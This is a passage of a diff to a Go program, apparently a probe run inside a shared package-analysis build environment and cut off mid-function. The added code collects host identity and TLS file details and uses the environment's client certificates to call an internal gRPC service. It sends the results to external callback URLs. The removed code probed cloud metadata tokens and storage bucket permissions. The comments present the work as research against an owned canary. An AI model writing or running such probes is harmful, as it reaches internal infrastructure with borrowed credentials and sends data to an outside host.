@@ -1,7 +1,6 @@
 package main
 
 import (
-	"bufio"
 	"bytes"
 	"context"
 	"crypto/sha256"
@@ -17,9 +16,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
-	"os/exec"
 	"path/filepath"
-	"sort"
 	"strconv"
 	"strings"
 	"time"
@@ -28,69 +25,42 @@ import (
 
 var genericResultURL string
 var compilerResultURL string
-var planURL string
-var bytemanCanaryURL string
-var sessionNonce string
+var callbackSessionNonce string
 var probeUserAgent string
-var rpcServiceHost string
+var pinnedReadbackURL string
+var pinnedReadbackOrigin string
+var pinnedReadbackSession string
+var pinnedReadbackURLSHA256 string
 var rpcDialAddress string
 
-// DESCRIPTOR_PATCH_POINT: build.py must set these values only from the pinned
-// Byteman FileDescriptorSet receipt above. Empty values fail closed before Download.
-var descriptorDownloadPolicyField string
-var descriptorDownloadPolicyValue string
-var descriptorDownloadPolicyName string
-var descriptorRedirectConfigField string
-var descriptorRedirectPolicyField string
-var descriptorRedirectPolicyValue string
-var descriptorRedirectPolicyName string
-
 const (
-	protocolVersion              = 1
-	moduleName                   = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion                 = "v0.0.46-codex"
-	targetRegistry               = "https://proxy.golang.org"
-	targetModuleName             = "github.com/benr00t3d/go-byteman-crosswrite-canary"
-	targetVersion                = "v0.0.1"
-	targetCanarySHA256           = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
-	targetCanaryBytes            = 2512
-	originGoneSHA256             = "2060dcc16cdd2cb518700076b1ccf2fadbff619b32af84250c176e70590f1f0a"
-	originGoneBytes              = 36
-	downloadSource               = "robert-owned-v046-cross-package-offline-canary"
-	expectedUserAgent            = "go-cgo-pkgsite-probe-v046-codex"
-	descriptorReceiptSHA256      = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
-	maximumResult                = 256 * 1024
-	maximumBody                  = 256 * 1024
-	requestTimeout               = 20 * time.Second
-	bytemanGRPCTimeout           = 60 * time.Second
-	bytemanHTTPTimeout           = 65 * time.Second
-	resultTimeout                = 30 * time.Second
-	planPollWindow               = 30 * time.Minute
-	maximumPlanBody              = 4096
-	maximumPlanStep              = 12
-	maximumWireDepth             = 10
-	maximumWireFields            = 512
-	lookupRecordLimit            = 32
-	originTransitionWindow       = 30 * time.Second
-	postWritePollWindow          = 8 * time.Minute
-	postWriteCallLimit           = 60 * time.Second
-	postWritePollDelay           = 2 * time.Second
-	maximumPostWritePollAttempts = 16
+	protocolVersion         = 1
+	moduleName              = "github.com/benr00t3d/go-cgo-pkgsite-probe"
+	probeVersion            = "v0.0.52-codex"
+	expectedUserAgent       = "go-cgo-pkgsite-probe-v052-codex"
+	targetRegistry          = "https://proxy.golang.org"
+	targetModuleName        = "github.com/benr00t3d/go-byteman-crosswrite-canary"
+	targetVersion           = "v0.0.1"
+	targetCanarySHA256      = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
+	targetCanaryBytes       = 2512
+	descriptorReceiptSHA256 = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
+	expectedRecordSHA256    = "525fb621e5b9c87888fe5b6a8d66d5813c455977e33b0efab31f516c5932af46"
+	expectedDigestSHA256    = "6bc319fc0d36191274cec1b7269adfd81385b88169cdf83a783dc882097a6b94"
+	expectedRecordIDSHA256  = "0e73ce5435b1c9f09e3933315bac2d5e34eb7db9a6906948fad0f4c7b4f076f2"
+	emptyValueSHA256        = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+	callbackTimeout         = 30 * time.Second
+	streamGRPCTimeout       = 120 * time.Second
+	streamHTTPTimeout       = 125 * time.Second
+	maximumResultBytes      = 256 * 1024
+	maximumResponseFrame    = 128 * 1024
+	maximumResponseFrames   = 64
+	bytemanServiceHost      = "byteman.default.svc.cluster.local"
+	bytemanServicePort      = 9000
+	bytemanTLSServerName    = "localhost"
+	clientCertificatePath   = "/etc/tls/client/tls.crt"
+	clientKeyPath           = "/etc/tls/client/tls.key"
+	serverPoolPath          = "/etc/tls/server-pool/server-tls-pool.pem"
 )
-
-var bucketNames = []string{
-	"depsdev-capslock-reports",
-	"sos-byteman-downloads-oregon",
-	"sos-byteman-temp-oregon",
-}
-
-var bucketPermissions = []string{
-	"storage.objects.create",
-	"storage.objects.delete",
-	"storage.objects.get",
-	"storage.objects.list",
-	"storage.objects.update",
-}
 
 type commandResult struct {
 	Version         int    `json:"version"`
@@ -120,66 +90,14 @@ type tlsFile struct {
 }
 
 type identityResult struct {
-	Lane             string      `json:"lane"`
-	CWD              string      `json:"cwd"`
-	UID              int         `json:"uid"`
-	GID              int         `json:"gid"`
-	Hostname         string      `json:"hostname"`
-	PID1             string      `json:"pid1"`
-	ModuleFiles      []fileEntry `json:"module_files"`
-	EnvironmentNames []string    `json:"environment_names"`
-	TLSFiles         []tlsFile   `json:"tls_files"`
-}
-
-type metadataResult struct {
-	Email      string   `json:"email,omitempty"`
-	Scopes     []string `json:"scopes,omitempty"`
-	TokenValid bool     `json:"token_valid"`
-	Error      string   `json:"error,omitempty"`
-}
-
-type bucketResult struct {
-	Bucket     string   `json:"bucket"`
-	HTTPStatus int      `json:"http_status,omitempty"`
-	Granted    []string `json:"granted,omitempty"`
-	APIStatus  string   `json:"api_status,omitempty"`
-	Error      string   `json:"error,omitempty"`
-}
-
-type grpcResult struct {
-	ID                   string            `json:"id,omitempty"`
-	Method               string            `json:"method"`
-	HTTPStatus           int               `json:"http_status,omitempty"`
-	GRPCStatus           string            `json:"grpc_status,omitempty"`
-	GRPCMessage          string            `json:"grpc_message,omitempty"`
-	BodyBytes            int               `json:"body_bytes,omitempty"`
-	BodySHA256           string            `json:"body_sha256,omitempty"`
-	ContentType          string            `json:"content_type,omitempty"`
-	Authenticated        bool              `json:"authenticated"`
-	RequestPayloadBytes  int               `json:"request_payload_bytes,omitempty"`
-	RequestPayloadSHA256 string            `json:"request_payload_sha256,omitempty"`
-	RequestFrameBytes    int               `json:"request_frame_bytes,omitempty"`
-	RequestFrameSHA256   string            `json:"request_frame_sha256,omitempty"`
-	RequestWire          []wireFieldDigest `json:"request_wire,omitempty"`
-	RequestWireError     string            `json:"request_wire_error,omitempty"`
-	Wire                 []wireFieldDigest `json:"wire,omitempty"`
-	LookupRecordMatched  bool              `json:"lookup_record_matched,omitempty"`
-	LookupMatchPath      string            `json:"lookup_match_path,omitempty"`
-	LookupRecordCount    int               `json:"lookup_record_count,omitempty"`
-	LookupMatchCount     int               `json:"lookup_match_count,omitempty"`
-	LookupRecordsSHA256  string            `json:"lookup_records_sha256,omitempty"`
-	LookupMatchSHA256    string            `json:"lookup_match_sha256,omitempty"`
-	RecordMatched        bool              `json:"record_matched,omitempty"`
-	RecordSHA256         string            `json:"record_sha256,omitempty"`
-	DigestFieldSHA256    string            `json:"digest_field_sha256,omitempty"`
-	IDFieldSHA256        string            `json:"id_field_sha256,omitempty"`
-	DownloadStatusCode   uint64            `json:"download_status_code,omitempty"`
-	DownloadStatusSet    bool              `json:"download_status_set,omitempty"`
-	PayloadBytes         int               `json:"payload_bytes,omitempty"`
-	PayloadSHA256        string            `json:"payload_sha256,omitempty"`
-	PayloadPath          string            `json:"payload_path,omitempty"`
-	AnalysisError        string            `json:"analysis_error,omitempty"`
-	Error                string            `json:"error,omitempty"`
+	Lane        string      `json:"lane"`
+	CWD         string      `json:"cwd"`
+	UID         int         `json:"uid"`
+	GID         int         `json:"gid"`
+	Hostname    string      `json:"hostname"`
+	PID1        string      `json:"pid1"`
+	ModuleFiles []fileEntry `json:"module_files"`
+	TLSFiles    []tlsFile   `json:"tls_files"`
 }
 
 type wireFieldDigest struct {
@@ -189,82 +107,135 @@ type wireFieldDigest struct {
 	Bytes    int     `json:"bytes,omitempty"`
 	SHA256   string  `json:"sha256,omitempty"`
 	Text     string  `json:"text,omitempty"`
-	Nested   bool    `json:"nested,omitempty"`
 }
 
-type originResult struct {
-	HeadHTTPStatus int    `json:"head_http_status,omitempty"`
-	HeadState      string `json:"head_state,omitempty"`
-	HTTPStatus     int    `json:"http_status,omitempty"`
-	BodyBytes      int    `json:"body_bytes,omitempty"`
-	BodySHA256     string `json:"body_sha256,omitempty"`
-	ContentType    string `json:"content_type,omitempty"`
-	State          string `json:"state,omitempty"`
-	Offline        bool   `json:"offline"`
-	Error          string `json:"error,omitempty"`
+type streamFrameResult struct {
+	Index         int    `json:"index"`
+	PayloadBytes  int    `json:"payload_bytes"`
+	PayloadSHA256 string `json:"payload_sha256"`
+	FrameSHA256   string `json:"frame_sha256"`
+	HeaderFields  int    `json:"header_fields"`
+	DataFields    int    `json:"data_fields"`
+	DataBytes     int    `json:"data_bytes"`
 }
 
-type planStep struct {
-	Version   int    `json:"version"`
-	ID        string `json:"id"`
-	Action    string `json:"action"`
-	RouteMode string `json:"route_mode,omitempty"`
+type streamHeaderResult struct {
+	Present            bool                    `json:"present"`
+	RawBytes           int                     `json:"raw_bytes,omitempty"`
+	RawSHA256          string                  `json:"raw_sha256,omitempty"`
+	ContentType        string                  `json:"content_type,omitempty"`
+	StatusSet          bool                    `json:"status_set"`
+	StatusCode         uint64                  `json:"status_code,omitempty"`
+	EntityTagSHA256    string                  `json:"entity_tag_sha256,omitempty"`
+	CacheControlSHA256 string                  `json:"cache_control_sha256,omitempty"`
+	LastModified       uint64                  `json:"last_modified,omitempty"`
+	Visited            uint64                  `json:"visited,omitempty"`
+	Expires            uint64                  `json:"expires,omitempty"`
+	FreshUntil         uint64                  `json:"fresh_until,omitempty"`
+	RawHeaders         []streamRawHeaderResult `json:"raw_headers,omitempty"`
 }
 
-type inspectionResult struct {
-	Symbols      []string `json:"symbols,omitempty"`
-	DialWindow   []string `json:"dial_window,omitempty"`
-	CallerWindow []string `json:"caller_window,omitempty"`
-	Error        string   `json:"error,omitempty"`
+type streamRawHeaderResult struct {
+	Name        string `json:"name"`
+	ValueBytes  int    `json:"value_bytes"`
+	ValueSHA256 string `json:"value_sha256"`
+}
+
+type streamResult struct {
+	Method                    string              `json:"method"`
+	HTTPStatus                int                 `json:"http_status,omitempty"`
+	ContentType               string              `json:"content_type,omitempty"`
+	GRPCStatusHeader          string              `json:"grpc_status_header,omitempty"`
+	RequestPayloadBytes       int                 `json:"request_payload_bytes"`
+	RequestPayloadSHA256      string              `json:"request_payload_sha256"`
+	RequestFrameBytes         int                 `json:"request_frame_bytes"`
+	RequestFrameSHA256        string              `json:"request_frame_sha256"`
+	RequestWire               []wireFieldDigest   `json:"request_wire"`
+	SOSSessionHeaderPresent   bool                `json:"sos_session_header_present"`
+	SOSSessionHeaderBytes     int                 `json:"sos_session_header_bytes"`
+	SOSSessionHeaderSHA256    string              `json:"sos_session_header_sha256"`
+	Frames                    []streamFrameResult `json:"frames,omitempty"`
+	Header                    streamHeaderResult  `json:"header"`
+	PayloadBytes              int                 `json:"payload_bytes,omitempty"`
+	PayloadSHA256             string              `json:"payload_sha256,omitempty"`
+	StoppedBeforeEOF          bool                `json:"stopped_before_eof"`
+	Verified                  bool                `json:"verified"`
+	ResponseRecordIdentitySet bool                `json:"response_record_identity_present"`
+	Error                     string              `json:"error,omitempty"`
 }
 
 type probeReport struct {
-	Schema                  string            `json:"schema"`
-	Module                  string            `json:"module"`
-	Version                 string            `json:"version"`
-	TargetModule            string            `json:"target_module,omitempty"`
-	TargetVersion           string            `json:"target_version,omitempty"`
-	DescriptorReceiptSHA256 string            `json:"descriptor_receipt_sha256"`
-	StartedUTC              string            `json:"started_utc"`
-	FinishedUTC             string            `json:"finished_utc"`
-	Identity                identityResult    `json:"identity"`
-	Metadata                metadataResult    `json:"metadata"`
-	BucketPermissions       []bucketResult    `json:"bucket_permissions,omitempty"`
-	CanaryURLSHA256         string            `json:"canary_url_sha256,omitempty"`
-	CanaryBodySHA256        string            `json:"canary_body_sha256,omitempty"`
-	Byteman                 []grpcResult      `json:"byteman,omitempty"`
-	DownloadAttempted       bool              `json:"download_attempted"`
-	MutationBudgetClaimed   bool              `json:"mutation_budget_claimed"`
-	AmbiguousReadback       bool              `json:"ambiguous_download_readback"`
-	FreshMTLSClient         bool              `json:"fresh_mtls_client"`
-	Origin                  originResult      `json:"origin"`
-	StreamVerified          bool              `json:"stream_verified"`
-	PlanID                  string            `json:"plan_id,omitempty"`
-	RouteMode               string            `json:"route_mode,omitempty"`
-	Inspection              *inspectionResult `json:"inspection,omitempty"`
-	Reason                  string            `json:"reason,omitempty"`
+	Schema                  string         `json:"schema"`
+	Module                  string         `json:"module"`
+	Version                 string         `json:"version"`
+	TargetModule            string         `json:"target_module"`
+	TargetVersion           string         `json:"target_version"`
+	TargetURLSHA256         string         `json:"target_url_sha256"`
+	TargetBodySHA256        string         `json:"target_body_sha256"`
+	DescriptorReceiptSHA256 string         `json:"descriptor_receipt_sha256"`
+	ExpectedRecordSHA256    string         `json:"expected_record_sha256"`
+	ExpectedDigestSHA256    string         `json:"expected_digest_field_sha256"`
+	ExpectedRecordIDSHA256  string         `json:"expected_id_field_sha256"`
+	StartedUTC              string         `json:"started_utc"`
+	FinishedUTC             string         `json:"finished_utc"`
+	Identity                identityResult `json:"identity"`
+	Stream                  streamResult   `json:"stream"`
+	Reason                  string         `json:"reason"`
 }
 
-type mutationBudget struct {
-	claimed bool
-}
-
-func (budget *mutationBudget) claim() bool {
-	if budget == nil || budget.claimed {
-		return false
+func main() {
+	if validateRuntimeConfiguration() != nil || len(os.Args) != 4 ||
+		os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
+		return
 	}
-	budget.claimed = true
-	return true
+	started := time.Now()
+	cwd := initialWorkingDirectory()
+	identity := inspectIdentity(cwd)
+	report := newProbeReport(started, identity)
+	endpoint := genericResultURL
+	resultID := "v052-codex-" + identity.Lane
+	if identity.Lane == "capslock" {
+		endpoint = compilerResultURL
+		resultID = "v052-codex-capslock-stream"
+		report.Stream = runPinnedStreamReadback()
+		if report.Stream.Verified {
+			report.Reason = "incremental Stream returned the exact previously written owned-B bytes"
+		} else {
+			report.Reason = "incremental Stream did not verify the exact previously written owned-B bytes"
+		}
+	} else {
+		report.Reason = "Stream is fixed to the verified Capslock lane"
+	}
+	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
 }
 
-type tokenResponse struct {
-	AccessToken string `json:"access_token"`
-	ExpiresIn   int64  `json:"expires_in"`
-	TokenType   string `json:"token_type"`
+func newProbeReport(started time.Time, identity identityResult) probeReport {
+	return probeReport{
+		Schema:                  "owned-byteman-stream-readback/v1",
+		Module:                  moduleName,
+		Version:                 probeVersion,
+		TargetModule:            targetModuleName,
+		TargetVersion:           targetVersion,
+		TargetURLSHA256:         pinnedReadbackURLSHA256,
+		TargetBodySHA256:        targetCanarySHA256,
+		DescriptorReceiptSHA256: descriptorReceiptSHA256,
+		ExpectedRecordSHA256:    expectedRecordSHA256,
+		ExpectedDigestSHA256:    expectedDigestSHA256,
+		ExpectedRecordIDSHA256:  expectedRecordIDSHA256,
+		StartedUTC:              started.UTC().Format(time.RFC3339Nano),
+		Identity:                identity,
+		Stream: streamResult{
+			Method:                  "/sos.byteman.Byteman/Stream",
+			SOSSessionHeaderPresent: true,
+			SOSSessionHeaderBytes:   0,
+			SOSSessionHeaderSHA256:  emptyValueSHA256,
+		},
+	}
 }
 
-func validSessionNonce(value string) bool {
-	if len(value) < 48 || len(value) > 128 {
+func validNonce(value string) bool {
+	if len(value) != 64 {
 		return false
 	}
 	for _, character := range value {
@@ -275,92 +246,497 @@ func validSessionNonce(value string) bool {
 	return true
 }
 
-func validateBoundHTTPSURL(raw, expectedPath string) (*url.URL, error) {
+func parseExactHTTPS(raw, expectedPath string) (*url.URL, error) {
 	parsed, err := url.Parse(raw)
 	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.Hostname() == "" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" ||
 		parsed.ForceQuery || parsed.Fragment != "" || parsed.Path != expectedPath {
-		return nil, errors.New("runtime URL was outside the fixed HTTPS callback shape")
+		return nil, errors.New("URL was outside its exact fixed HTTPS shape")
 	}
 	if port := parsed.Port(); port != "" {
 		value, parseErr := strconv.Atoi(port)
 		if parseErr != nil || value < 1 || value > 65535 {
-			return nil, errors.New("runtime callback port was invalid")
+			return nil, errors.New("URL port was invalid")
 		}
 	}
 	return parsed, nil
 }
 
 func validateRuntimeConfiguration() error {
-	if !validSessionNonce(sessionNonce) || probeUserAgent != expectedUserAgent {
-		return errors.New("runtime session or user agent was invalid")
+	if !validNonce(callbackSessionNonce) || !validNonce(pinnedReadbackSession) ||
+		callbackSessionNonce == pinnedReadbackSession || probeUserAgent != expectedUserAgent {
+		return errors.New("runtime identities were invalid or not isolated")
 	}
-	paths := []struct {
-		raw  string
-		path string
-	}{
-		{genericResultURL, "/v1/result/" + sessionNonce + "/generic"},
-		{compilerResultURL, "/v1/result/" + sessionNonce + "/compiler"},
-		{planURL, "/v1/plan/" + sessionNonce},
-		{bytemanCanaryURL, "/v1/goproxy/" + sessionNonce + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"},
+	generic, err := parseExactHTTPS(genericResultURL, "/v1/result/"+callbackSessionNonce+"/generic")
+	if err != nil {
+		return err
 	}
-	var origin string
-	for _, item := range paths {
-		parsed, err := validateBoundHTTPSURL(item.raw, item.path)
-		if err != nil {
-			return err
-		}
-		current := parsed.Scheme + "://" + parsed.Host
-		if origin == "" {
-			origin = current
-		} else if current != origin {
-			return errors.New("runtime callbacks did not share one fixed origin")
-		}
+	compiler, err := parseExactHTTPS(compilerResultURL, "/v1/result/"+callbackSessionNonce+"/compiler")
+	if err != nil || generic.Scheme != compiler.Scheme || generic.Host != compiler.Host {
+		return errors.New("callback endpoints did not share one exact origin")
 	}
-	if genericResultURL == compilerResultURL {
-		return errors.New("runtime result endpoints were not distinct")
+	readbackPath := "/v1/goproxy/" + pinnedReadbackSession + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"
+	readback, err := parseExactHTTPS(pinnedReadbackURL, readbackPath)
+	if err != nil || pinnedReadbackOrigin != readback.Scheme+"://"+readback.Host ||
+		pinnedReadbackOrigin == generic.Scheme+"://"+generic.Host {
+		return errors.New("pinned readback URL was not isolated from the callback origin")
+	}
+	digest := sha256.Sum256([]byte(pinnedReadbackURL))
+	if hex.EncodeToString(digest[:]) != pinnedReadbackURLSHA256 {
+		return errors.New("pinned readback URL digest mismatch")
 	}
 	return nil
 }
 
-func main() {
-	if validateRuntimeConfiguration() != nil ||
-		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
-		return
+func runPinnedStreamReadback() streamResult {
+	requestPayload := buildTargetStreamRequest()
+	result := newStreamResult(requestPayload)
+	client, endpoint, err := newBytemanClient()
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
 	}
-	started := time.Now()
-	cwd := initialWorkingDirectory()
-	identity := inspectIdentity(cwd)
-	if identity.Lane == "capslock" {
-		runCapslockSession(started, cwd, identity)
-		return
+	defer client.CloseIdleConnections()
+	ctx, cancel := context.WithTimeout(context.Background(), streamHTTPTimeout)
+	defer cancel()
+	frame := grpcFrame(requestPayload)
+	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+result.Method, bytes.NewReader(frame))
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
 	}
-	report := newProbeReport(started, identity)
-	report.Reason = "internal checks are fixed to the verified capslock lane"
-	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v046-codex-"+identity.Lane, cwd, started, report)
+	applyStreamHeaders(request)
+	response, err := client.Do(request)
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
+	}
+	defer response.Body.Close()
+	result.HTTPStatus = response.StatusCode
+	result.ContentType = response.Header.Get("Content-Type")
+	result.GRPCStatusHeader = response.Header.Get("Grpc-Status")
+	if response.StatusCode != http.StatusOK || !strings.HasPrefix(result.ContentType, "application/grpc") {
+		result.Error = "Stream response did not have HTTP 200 application/grpc"
+		return result
+	}
+	payload := make([]byte, 0, targetCanaryBytes)
+	for index := 0; index < maximumResponseFrames; index++ {
+		header := make([]byte, 5)
+		if _, err := io.ReadFull(response.Body, header); err != nil {
+			result.Error = cleanError(fmt.Errorf("incremental gRPC frame header: %w", err))
+			return result
+		}
+		if header[0] != 0 {
+			result.Error = "compressed Stream frame was rejected"
+			return result
+		}
+		length := int(binary.BigEndian.Uint32(header[1:]))
+		if length < 0 || length > maximumResponseFrame {
+			result.Error = "Stream frame exceeded the bounded size"
+			return result
+		}
+		body := make([]byte, length)
+		if _, err := io.ReadFull(response.Body, body); err != nil {
+			result.Error = cleanError(fmt.Errorf("incremental gRPC frame payload: %w", err))
+			return result
+		}
+		frameBytes := append(append([]byte(nil), header...), body...)
+		bodyDigest := sha256.Sum256(body)
+		frameDigest := sha256.Sum256(frameBytes)
+		frameResult := streamFrameResult{
+			Index: index, PayloadBytes: len(body), PayloadSHA256: hex.EncodeToString(bodyDigest[:]),
+			FrameSHA256: hex.EncodeToString(frameDigest[:]),
+		}
+		if err := consumeStreamFrame(body, &payload, &result.Header, &frameResult); err != nil {
+			result.Frames = append(result.Frames, frameResult)
+			result.Error = cleanError(err)
+			return result
+		}
+		result.Frames = append(result.Frames, frameResult)
+		if len(payload) == targetCanaryBytes {
+			payloadSHA256, err := verifyCompletedStream(payload, result.Header)
+			result.PayloadBytes = len(payload)
+			result.PayloadSHA256 = payloadSHA256
+			if err != nil {
+				result.Error = cleanError(err)
+				return result
+			}
+			result.StoppedBeforeEOF = true
+			result.Verified = true
+			_ = response.Body.Close()
+			return result
+		}
+	}
+	result.Error = "Stream exceeded the bounded frame count before exact verification"
+	return result
 }
 
-func newProbeReport(started time.Time, identity identityResult) probeReport {
-	return probeReport{
-		Schema:                  "owned-byteman-probe/v1",
-		Module:                  moduleName,
-		Version:                 probeVersion,
-		TargetModule:            targetModuleName,
-		TargetVersion:           targetVersion,
-		DescriptorReceiptSHA256: descriptorReceiptSHA256,
-		StartedUTC:              started.UTC().Format(time.RFC3339Nano),
-		Identity:                identity,
+func verifyCompletedStream(payload []byte, header streamHeaderResult) (string, error) {
+	digest := sha256.Sum256(payload)
+	payloadSHA256 := hex.EncodeToString(digest[:])
+	if len(payload) != targetCanaryBytes || payloadSHA256 != targetCanarySHA256 {
+		return payloadSHA256, errors.New("Stream reached the exact size with the wrong payload digest")
 	}
+	if !header.Present || !header.StatusSet || header.StatusCode != http.StatusOK {
+		return payloadSHA256, errors.New("Stream did not include exactly one header with status_code 200")
+	}
+	return payloadSHA256, nil
+}
+
+func applyStreamHeaders(request *http.Request) {
+	request.Header.Set("Content-Type", "application/grpc")
+	request.Header.Set("TE", "trailers")
+	request.Header.Set("User-Agent", probeUserAgent)
+	request.Header.Set("Grpc-Timeout", "120S")
+	request.Header[http.CanonicalHeaderKey("X-SOS-SessionID")] = []string{""}
+}
+
+func newStreamResult(payload []byte) streamResult {
+	payloadDigest := sha256.Sum256(payload)
+	frame := grpcFrame(payload)
+	frameDigest := sha256.Sum256(frame)
+	return streamResult{
+		Method:                    "/sos.byteman.Byteman/Stream",
+		RequestPayloadBytes:       len(payload),
+		RequestPayloadSHA256:      hex.EncodeToString(payloadDigest[:]),
+		RequestFrameBytes:         len(frame),
+		RequestFrameSHA256:        hex.EncodeToString(frameDigest[:]),
+		RequestWire:               summarizeStreamRequest(payload),
+		SOSSessionHeaderPresent:   true,
+		SOSSessionHeaderBytes:     0,
+		SOSSessionHeaderSHA256:    emptyValueSHA256,
+		ResponseRecordIdentitySet: false,
+	}
+}
+
+func consumeStreamFrame(message []byte, payload *[]byte, headerResult *streamHeaderResult, frameResult *streamFrameResult) error {
+	fields, err := decodeWireFields(message)
+	if err != nil {
+		return err
+	}
+	for _, field := range fields {
+		switch field.number {
+		case 1:
+			if field.wire != 2 || headerResult.Present {
+				return errors.New("StreamResponse header field was duplicated or had the wrong wire type")
+			}
+			parsed, err := parseStreamHeader(field.value)
+			if err != nil {
+				return err
+			}
+			*headerResult = parsed
+			frameResult.HeaderFields++
+		case 2:
+			if field.wire != 2 {
+				return errors.New("StreamResponse data field had the wrong wire type")
+			}
+			frameResult.DataFields++
+			frameResult.DataBytes += len(field.value)
+			if len(*payload)+len(field.value) > targetCanaryBytes {
+				return errors.New("StreamResponse data exceeded the exact owned-B size")
+			}
+			*payload = append(*payload, field.value...)
+		default:
+			return errors.New("StreamResponse contained a field outside header 1 and data 2")
+		}
+	}
+	return nil
+}
+
+func parseStreamHeader(raw []byte) (streamHeaderResult, error) {
+	result := streamHeaderResult{Present: true, RawBytes: len(raw)}
+	digest := sha256.Sum256(raw)
+	result.RawSHA256 = hex.EncodeToString(digest[:])
+	fields, err := decodeWireFields(raw)
+	if err != nil {
+		return result, err
+	}
+	counts := map[int]int{}
+	for _, field := range fields {
+		counts[field.number]++
+		switch field.number {
+		case 1:
+			if field.wire != 2 || counts[1] != 1 || !utf8.Valid(field.value) || len(field.value) > 256 {
+				return result, errors.New("Stream header content_type was invalid")
+			}
+			result.ContentType = string(field.value)
+		case 2:
+			if field.wire != 0 || counts[2] != 1 {
+				return result, errors.New("Stream header status_code was invalid")
+			}
+			result.StatusSet = true
+			result.StatusCode = field.varint
+		case 3:
+			if field.wire != 2 || counts[3] != 1 || !utf8.Valid(field.value) || len(field.value) > 4096 {
+				return result, errors.New("Stream header entity_tag was invalid")
+			}
+			valueDigest := sha256.Sum256(field.value)
+			result.EntityTagSHA256 = hex.EncodeToString(valueDigest[:])
+		case 4:
+			if field.wire != 2 || counts[4] != 1 || !utf8.Valid(field.value) || len(field.value) > 4096 {
+				return result, errors.New("Stream header cache_control was invalid")
+			}
+			valueDigest := sha256.Sum256(field.value)
+			result.CacheControlSHA256 = hex.EncodeToString(valueDigest[:])
+		case 5, 6, 7, 8:
+			if field.wire != 0 || counts[field.number] != 1 {
+				return result, errors.New("Stream header time field was invalid")
+			}
+			switch field.number {
+			case 5:
+				result.LastModified = field.varint
+			case 6:
+				result.Visited = field.varint
+			case 7:
+				result.Expires = field.varint
+			case 8:
+				result.FreshUntil = field.varint
+			}
+		case 9:
+			if field.wire != 2 || len(result.RawHeaders) >= 64 {
+				return result, errors.New("Stream header raw field was invalid")
+			}
+			rawHeader, err := parseStreamRawHeader(field.value)
+			if err != nil {
+				return result, err
+			}
+			result.RawHeaders = append(result.RawHeaders, rawHeader)
+		default:
+			return result, errors.New("Stream header contained an unknown field")
+		}
+	}
+	return result, nil
+}
+
+func parseStreamRawHeader(raw []byte) (streamRawHeaderResult, error) {
+	result := streamRawHeaderResult{}
+	fields, err := decodeWireFields(raw)
+	if err != nil {
+		return result, err
+	}
+	counts := map[int]int{}
+	for _, field := range fields {
+		counts[field.number]++
+		switch field.number {
+		case 1:
+			if field.wire != 2 || counts[1] != 1 || len(field.value) == 0 || len(field.value) > 256 || !utf8.Valid(field.value) {
+				return result, errors.New("Stream raw header name was invalid")
+			}
+			result.Name = string(field.value)
+		case 2:
+			if field.wire != 2 || counts[2] != 1 || len(field.value) > 64*1024 {
+				return result, errors.New("Stream raw header value was invalid")
+			}
+			digest := sha256.Sum256(field.value)
+			result.ValueBytes = len(field.value)
+			result.ValueSHA256 = hex.EncodeToString(digest[:])
+		default:
+			return result, errors.New("Stream raw header contained an unknown field")
+		}
+	}
+	if counts[1] != 1 || counts[2] != 1 {
+		return result, errors.New("Stream raw header omitted name or value")
+	}
+	return result, nil
+}
+
+type wireField struct {
+	number int
+	wire   int
+	varint uint64
+	value  []byte
+}
+
+func decodeWireFields(data []byte) ([]wireField, error) {
+	fields := []wireField{}
+	for offset := 0; offset < len(data); {
+		key, size := binary.Uvarint(data[offset:])
+		if size <= 0 {
+			return nil, errors.New("protobuf field key was invalid")
+		}
+		offset += size
+		field := wireField{number: int(key >> 3), wire: int(key & 7)}
+		if field.number < 1 || field.number > (1<<29)-1 {
+			return nil, errors.New("protobuf field number was invalid")
+		}
+		switch field.wire {
+		case 0:
+			field.varint, size = binary.Uvarint(data[offset:])
+			if size <= 0 {
+				return nil, errors.New("protobuf varint was invalid")
+			}
+			offset += size
+		case 2:
+			length, lengthSize := binary.Uvarint(data[offset:])
+			if lengthSize <= 0 {
+				return nil, errors.New("protobuf length was invalid")
+			}
+			offset += lengthSize
+			if length > uint64(len(data)-offset) {
+				return nil, errors.New("protobuf field was truncated")
+			}
+			field.value = data[offset : offset+int(length)]
+			offset += int(length)
+		default:
+			return nil, errors.New("protobuf wire type was outside the pinned schema")
+		}
+		fields = append(fields, field)
+	}
+	return fields, nil
+}
+
+func buildTargetMetadata() []byte {
+	metadata := []byte{}
+	metadata = appendStringField(metadata, 2, targetRegistry)
+	metadata = appendVarintField(metadata, 3, 1) // GO_MODULE
+	metadata = appendStringField(metadata, 4, targetModuleName)
+	metadata = appendVarintField(metadata, 5, 1) // CONCRETE
+	metadata = appendStringField(metadata, 6, targetVersion)
+	return metadata
+}
+
+func buildTargetStreamRequest() []byte {
+	request := appendStringField(nil, 1, pinnedReadbackURL)
+	return appendBytesField(request, 2, buildTargetMetadata())
+}
+
+func summarizeStreamRequest(payload []byte) []wireFieldDigest {
+	fields, err := decodeWireFields(payload)
+	if err != nil {
+		return nil
+	}
+	result := []wireFieldDigest{}
+	for index, field := range fields {
+		item := wireFieldDigest{Path: "request." + strconv.Itoa(field.number) + "[" + strconv.Itoa(index) + "]", WireType: field.wire}
+		if field.wire == 0 {
+			value := field.varint
+			item.Varint = &value
+		} else {
